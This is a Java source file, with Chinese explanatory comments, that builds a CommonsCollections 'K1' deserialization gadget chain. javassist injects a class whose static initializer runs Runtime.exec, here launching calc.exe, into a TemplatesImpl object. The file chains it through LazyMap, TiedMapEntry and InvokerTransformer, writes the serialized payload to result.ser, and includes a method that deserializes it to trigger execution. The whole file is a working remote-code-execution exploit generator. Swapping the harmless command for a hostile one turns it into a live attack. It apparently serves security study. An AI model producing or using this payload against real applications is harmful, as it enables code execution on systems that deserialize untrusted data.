package org.example.k1;


import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Transformer;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CommonCollectionsK1 {

    public static void main(String[] args) throws Exception{
        // ClassPool是 CtClass 对象的容器。实例化一个ClassPool容器。
        ClassPool pool = ClassPool.getDefault();
        // 向容器中的类搜索路径的起始位置插入AbstractTranslet.class，个人认为是方便让后面能够找到这个类
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        // 使用容器新建一个CtClass，相当于新建一个class，类名为Cat
        CtClass cc = pool.makeClass("Cat");
        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc.exe\");";
        // 给这个类创建 static 代码块，并插入到类中
        cc.makeClassInitializer().insertBefore(cmd);
        String randomClassName = "EvilCat" + System.nanoTime();
        // 重新设置类名为一个随机的名字
        cc.setName(randomClassName);
        // 给这个类添加一个父类，即继承该父类。
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); //设置父类为AbstractTranslet，避免报错
        // 将这个类输出到项目目录下
        cc.writeFile("./");
        // 将这个class转换为字节数组
        byte[] classBytes = cc.toBytecode();

        getPayload(classBytes);
//        readObject();
    }
    public static void getPayload(byte[] bytecode) throws Exception{
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{bytecode});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        // 构造链调用obj.newTransformer()

        InvokerTransformer transformer = new InvokerTransformer("newTransformer", null, null);
        ConstantTransformer faketransformer = new ConstantTransformer(1);
        Map outmap = new HashMap();
        // 后面的map.put方法会调用一次利用链，所以防止报错，这里需要给一个无害transformer
        Map lazyMap = LazyMap.decorate(outmap,faketransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, obj);
        Map map = new HashMap();
        map.put(tiedMapEntry,"213");

        setFieldValue(lazyMap, "factory", transformer);
        // map.put方法中会进入lazymap的get方法。在该方法中，会调用一次transform方法，返回值赋值给value，之后会执行map.put(key,value)。所以map中会多了一个TemplateImpl对象。这样会导致反序列化调用的时候无法进入if判断，所以需要进行clear.
        outmap.clear();

        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(new File("result.ser")));
        oos.writeObject(map);
        oos.close();
    }

    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        }
        catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static void readObject() throws IOException, ClassNotFoundException {
        // 反序列化对象
        FileInputStream fileInputStream = new FileInputStream("result.ser");
        ObjectInputStream ois = new ObjectInputStream(fileInputStream);

        ois.readObject();
    }
}


